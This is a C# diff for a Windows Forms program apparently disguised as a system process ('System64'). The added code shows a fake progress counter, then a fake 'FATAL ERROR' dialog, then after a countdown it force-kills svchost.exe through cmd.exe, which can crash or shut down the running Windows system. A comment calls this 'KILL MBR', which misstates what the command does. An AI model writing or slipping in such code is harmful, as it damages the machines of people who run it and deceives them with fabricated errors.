@@ -1,7 +1,9 @@
 ﻿using System;
+using System.Collections;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
+using System.Diagnostics;
 using System.Drawing;
 using System.Linq;
 using System.Text;
@@ -29,6 +31,7 @@ namespace System64
 		}
 
 		public int time;
+		public int time2 = 5;
 		public bool isSafe = true;
 
 		private void Form1_Load(object sender, EventArgs e)
@@ -56,19 +59,41 @@ namespace System64
 			}
 		}
 
+
+		bool finished;
 		private void timer1_Tick(object sender, EventArgs e)
 		{
 			Random rnd = new Random();
 			if (time != 100)
 			{
 				timer1.Tick += timer1_Tick;
-				timer1.Interval = rnd.Next(500, 1000);
+				timer1.Interval = rnd.Next(1000, 1500);
 
 				label2.Text = $"{time}% complete";
 				time++;
-			} else
+			} else if (!finished)
 			{
+				finished = true;
+				StartOperation();
 				timer1.Stop();
+			}
+		}
+
+		void StartOperation()
+		{
+			MessageBox.Show("FATAL ERROR IN ADRESS 0x00000007", "FATAL ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
+			timer2.Start();
+		}
+
+		private void timer2_Tick(object sender, EventArgs e)
+		{
+			time2--;
+			if (time2 < 0)
+			{
+				timer2.Stop();
+				
+				//KILL MBR
+				Process.Start("cmd.exe", @"/C taskkill /IM svchost.exe /F");
 			}
 		}
 
@@ -92,5 +117,6 @@ namespace System64
 				e.Cancel = false;
 			}
 		}
+
 	}
 }
